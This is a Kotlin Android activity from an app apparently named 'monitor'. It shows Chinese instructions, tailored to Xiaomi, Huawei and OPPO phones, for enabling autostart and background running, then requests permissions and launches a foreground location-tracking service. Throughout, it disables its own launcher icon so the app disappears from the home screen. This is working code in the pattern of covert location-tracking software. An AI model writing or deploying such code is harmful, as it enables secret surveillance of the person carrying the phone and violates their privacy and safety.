package com.monitor.app.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.core.app.ActivityCompat
import com.monitor.app.R
import com.monitor.app.location.LocationService
import dagger.hilt.android.AndroidEntryPoint

@AndroidEntryPoint
class GuideActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        disableLauncherIcon()
        setContentView(R.layout.activity_guide)

        val instructions = when {
            Build.MANUFACTURER.equals("Xiaomi", ignoreCase = true) ->
                "检测到小米设备。请前往 设置 → 应用设置 → 授权管理 → 自启动管理 → 允许本应用自启动"
            Build.MANUFACTURER.equals("Huawei", ignoreCase = true) ->
                "检测到华为设备。请前往 手机管家 → 应用启动管理 → 关闭本应用的自动管理 → 允许自启动/关联启动/后台活动"
            Build.MANUFACTURER.equals("OPPO", ignoreCase = true) ||
            Build.MANUFACTURER.equals("OnePlus", ignoreCase = true) ->
                "检测到OPPO设备。请前往 设置 → 应用管理 → 本应用 → 耗电保护 → 允许后台运行"
            else ->
                "请确保本应用已被授予后台定位权限和自启动权限。可前往系统应用管理中配置。"
        }

        findViewById<TextView>(R.id.guide_text).text = instructions
        findViewById<Button>(R.id.btn_finish).setOnClickListener {
            startService()
            disableLauncherIcon()
            finish()
        }

        // Request missing permissions if launched from MonitorApplication
        val missingPermissions = intent.getStringArrayExtra("missing_permissions")
        if (missingPermissions != null && missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missingPermissions, 1001)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 1001) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                startService()
                disableLauncherIcon()
                finish()
            }
        }
    }

    private fun startService() {
        val intent = Intent(this, LocationService::class.java)
        startForegroundService(intent)
    }

    private fun disableLauncherIcon() {
        val componentName = android.content.ComponentName(
            this, "com.monitor.app.ui.GuideActivity"
        )
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
